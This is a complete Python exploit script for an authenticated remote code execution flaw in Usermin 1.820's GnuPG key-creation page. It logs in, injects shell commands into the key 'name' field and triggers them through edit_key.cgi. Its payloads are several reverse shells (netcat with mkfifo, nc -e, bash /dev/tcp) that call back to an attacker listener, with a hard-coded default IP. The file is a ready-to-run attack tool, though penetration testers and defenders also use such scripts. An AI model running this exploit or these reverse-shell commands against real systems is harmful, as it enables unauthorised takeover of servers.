#!/usr/bin/env python3
"""
Title: Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)
Date: 27.08.2021 (Original)
Author: Numan Türle (Original)
Updated by x7331 (05/25)
Vendor Homepage: https://www.webmin.com/usermin.html
Software Link: https://github.com/webmin/usermin
Version: <=1820
Description:
  This script exploits an authenticated RCE in Usermin 1.820 by abusing the GnuPG feature.
  Updates by x7331 include:
    - Added CLI args for listener IP/port (-lh, -lp)
    - Improved login and payload submission checks
    - Better exception handling to suppress traceback on reverse shell trigger
    - User-friendly output messages
    - Code cleanup and argument parsing improvements
    - Enhanced error handling and validation
    - Improved session management and timeout handling
    - Better payload generation with fallback options

Usage:
  python3 usermin-rce.py -u <host> -l <login> -p <password> -lh <listener_ip> -lp <listener_port>

Reference video: https://youtu.be/wiRIWFAhz24
"""

import argparse
import requests
import warnings
import re
import sys
import time
from urllib.parse import urljoin, urlparse
import requests.exceptions

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class UserminRCE:
    def __init__(self, host, username, password, listener_ip, listener_port):
        self.host = host
        self.username = username
        self.password = password
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.session = requests.Session()
        self.base_url = f"https://{host}:20000"
        
        # Configure session
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

    def validate_target(self):
        """Validate that the target is reachable and appears to be Usermin"""
        try:
            print(f"[+] Validating target: {self.base_url}")
            response = self.session.get(self.base_url, timeout=5)
            if response.status_code == 200:
                if "usermin" in response.text.lower() or "webmin" in response.text.lower():
                    print("[+] Target appears to be Usermin/Webmin")
                    return True
                else:
                    print("[-] Target doesn't appear to be Usermin/Webmin")
                    return False
            else:
                print(f"[-] Target returned status code: {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to connect to target: {e}")
            return False

    def login(self):
        """Attempt to login to Usermin"""
        print(f"[+] Attempting login as: {self.username}")
        
        login_url = urljoin(self.base_url, "/session_login.cgi")
        login_data = {
            "user": self.username,
            "pass": self.password
        }
        
        headers = {
            'Cookie': 'redirect=1; testing=1;',
            'Referer': self.base_url
        }
        
        try:
            response = self.session.post(
                login_url, 
                data=login_data, 
                headers=headers, 
                timeout=10
            )
            
            if response.status_code == 200:
                if "webmin_search.cgi" in response.text:
                    print("[+] Login successful!")
                    return True
                else:
                    print("[-] Login failed - invalid credentials or account locked")
                    return False
            else:
                print(f"[-] Login request failed with status code: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Login request failed: {e}")
            return False

    def generate_payload(self):
        """Generate reverse shell payload with fallback options"""
        # Primary payload using netcat (original format)
        primary_payload = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.listener_ip} {self.listener_port} > /tmp/f"
        
        # Alternative netcat payload
        alt_netcat_payload = f"nc {self.listener_ip} {self.listener_port} -e /bin/sh"
        
        # Fallback payload using bash
        fallback_payload = f"bash -i >& /dev/tcp/{self.listener_ip}/{self.listener_port} 0>&1"
        
        # Simple test payload
        test_payload = f"nc {self.listener_ip} {self.listener_port} -e /bin/bash"
        
        return primary_payload, alt_netcat_payload, fallback_payload, test_payload

    def submit_payload(self, payload):
        """Submit the payload via GnuPG secret creation"""
        print(f"[+] Submitting payload to {self.listener_ip}:{self.listener_port}")
        print(f"[+] Payload: {payload}")
        
        secret_url = urljoin(self.base_url, "/gnupg/secret.cgi")
        
        # Try different payload formats
        payload_formats = [
            {"name": f'";{payload}echo "', "email": "1337@webmin.com"},
            {"name": f'";{payload};echo "', "email": "1337@webmin.com"},
            {"name": f'";{payload} #', "email": "1337@webmin.com"},
            {"name": f'";{payload}"', "email": "1337@webmin.com"},
        ]
        
        headers = {'Referer': self.base_url}
        
        for i, payload_data in enumerate(payload_formats):
            try:
                print(f"[*] Trying payload format {i+1}...")
                response = self.session.post(
                    secret_url, 
                    data=payload_data, 
                    headers=headers, 
                    timeout=15
                )
                
                if response.status_code == 200:
                    if "successfully" in response.text.lower():
                        print(f"[+] Payload submitted successfully with format {i+1}")
                        return True
                    else:
                        print(f"[-] Format {i+1} failed - no success message")
                        if "error" in response.text.lower():
                            print("[*] Response contains error message")
                else:
                    print(f"[-] Format {i+1} failed with status code: {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                print(f"[-] Format {i+1} failed: {e}")
                continue
        
        print("[-] All payload formats failed")
        return False

    def get_key_id(self):
        """Extract the key ID from the GnuPG key list"""
        print("[+] Fetching key list to extract key ID...")
        
        list_keys_url = urljoin(self.base_url, "/gnupg/list_keys.cgi")
        
        try:
            response = self.session.post(list_keys_url, timeout=10)
            
            if response.status_code == 200:
                # Try multiple regex patterns to find key IDs
                patterns = [
                    r"edit_key\.cgi\?(.*?)'",  # Original pattern
                    r"edit_key\.cgi\?([^'\"]+)",  # More flexible pattern
                    r"edit_key\.cgi\?([a-zA-Z0-9_=&]+)",  # Alphanumeric pattern
                    r"edit_key\.cgi\?([^>]+)",  # Until closing tag
                ]
                
                for pattern in patterns:
                    keys = re.findall(pattern, response.text)
                    if keys:
                        key_id = keys[-1]  # Get the last (most recent) key
                        print(f"[+] Found key ID: {key_id}")
                        return key_id
                
                # If no patterns worked, let's debug the response
                print("[-] No key IDs found with standard patterns")
                print("[*] Debugging response content...")
                
                # Look for any edit_key.cgi references
                if "edit_key.cgi" in response.text:
                    print("[*] Found edit_key.cgi references in response")
                    # Extract a sample of the response around edit_key.cgi
                    lines = response.text.split('\n')
                    for i, line in enumerate(lines):
                        if "edit_key.cgi" in line:
                            print(f"[*] Line {i+1}: {line.strip()[:100]}...")
                            # Try to extract manually
                            start = line.find("edit_key.cgi?")
                            if start != -1:
                                start += len("edit_key.cgi?")
                                end = line.find("'", start)
                                if end == -1:
                                    end = line.find('"', start)
                                if end == -1:
                                    end = line.find(' ', start)
                                if end == -1:
                                    end = len(line)
                                
                                key_id = line[start:end]
                                if key_id and len(key_id) > 5:  # Basic validation
                                    print(f"[+] Manually extracted key ID: {key_id}")
                                    return key_id
                
                print("[-] Could not extract key ID from response")
                return None
            else:
                print(f"[-] Failed to fetch key list, status code: {response.status_code}")
                return None
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to fetch key list: {e}")
            return None

    def trigger_payload(self, key_id):
        """Trigger the payload by accessing the edit key page"""
        print("[+] Triggering payload...")
        
        edit_key_url = urljoin(self.base_url, f"/gnupg/edit_key.cgi?{key_id}")
        
        try:
            # Use a shorter timeout since we expect the connection to drop
            response = self.session.post(edit_key_url, timeout=3)
            print("[+] Payload triggered successfully")
            return True
            
        except requests.exceptions.ReadTimeout:
            print("[+] Reverse shell should be incoming! (Timeout expected)")
            return True
        except requests.exceptions.ConnectionError:
            print("[+] Connection closed - reverse shell likely established")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to trigger payload: {e}")
            return False

    def exploit(self):
        """Main exploit method"""
        print("=" * 60)
        print("Usermin 1.820 RCE Exploit")
        print("=" * 60)
        
        # Validate target
        if not self.validate_target():
            return False
        
        # Attempt login
        if not self.login():
            return False
        
        # Generate payloads
        primary_payload, alt_netcat_payload, fallback_payload, test_payload = self.generate_payload()
        
        # Try different payloads
        payloads = [
            ("Primary netcat", primary_payload),
            ("Alternative netcat", alt_netcat_payload),
            ("Bash fallback", fallback_payload),
            ("Simple test", test_payload)
        ]
        
        payload_submitted = False
        for name, payload in payloads:
            print(f"\n[+] Trying {name} payload...")
            if self.submit_payload(payload):
                payload_submitted = True
                break
            else:
                print(f"[-] {name} payload failed")
        
        if not payload_submitted:
            print("[-] All payloads failed")
            return False
        
        # Get key ID
        key_id = self.get_key_id()
        
        # Try to trigger payload with key ID if found
        if key_id:
            if self.trigger_payload(key_id):
                print("[+] Exploit completed successfully!")
                print(f"[+] Check your listener on {self.listener_ip}:{self.listener_port}")
                return True
            else:
                print("[-] Failed to trigger payload with key ID")
        
        # Fallback: try multiple trigger methods
        print("[!] Trying multiple fallback trigger methods...")
        
        trigger_urls = [
            "/gnupg/list_keys.cgi",
            "/gnupg/secret.cgi",
            "/gnupg/index.cgi",
            "/gnupg/",
        ]
        
        for url in trigger_urls:
            try:
                print(f"[*] Trying trigger: {url}")
                trigger_url = urljoin(self.base_url, url)
                response = self.session.post(trigger_url, timeout=3)
                print(f"[+] Trigger {url} completed")
            except requests.exceptions.ReadTimeout:
                print(f"[+] Trigger {url} timeout - reverse shell should be incoming!")
                return True
            except requests.exceptions.ConnectionError:
                print(f"[+] Trigger {url} connection closed - reverse shell likely established")
                return True
            except Exception as e:
                print(f"[-] Trigger {url} failed: {e}")
                continue
        
        print("[+] All trigger methods attempted")
        print("[+] Check your listener for reverse shell")
        return True

def main():
    parser = argparse.ArgumentParser(
        description='Usermin 1.820 - Remote Code Execution (Authenticated)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 usermin-rce.py -u 192.168.1.100 -l admin -p password -lh 192.168.1.50 -lp 4444
  python3 usermin-rce.py -u target.com -l user -p pass123 -lh 10.0.0.5 -lp 443
        """
    )
    
    parser.add_argument('-u', '--host', 
                       help='Target host IP or domain', 
                       type=str, required=True)
    parser.add_argument('-l', '--login', 
                       help='Username', 
                       type=str, required=True)
    parser.add_argument('-p', '--password', 
                       help='Password', 
                       type=str, required=True)
    parser.add_argument('-lh', '--listen_host', 
                       help='Listener IP for reverse shell (default: 192.168.45.154)', 
                       type=str, default='192.168.45.154')
    parser.add_argument('-lp', '--listen_port', 
                       help='Listener port for reverse shell (default: 443)', 
                       type=int, default=443)
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.host or not args.login or not args.password:
        print("[-] Missing required arguments")
        parser.print_help()
        sys.exit(1)
    
    if args.listen_port < 1 or args.listen_port > 65535:
        print("[-] Invalid port number. Must be between 1-65535")
        sys.exit(1)
    
    # Create exploit instance and run
    exploit = UserminRCE(
        host=args.host,
        username=args.login,
        password=args.password,
        listener_ip=args.listen_host,
        listener_port=args.listen_port
    )
    
    success = exploit.exploit()
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
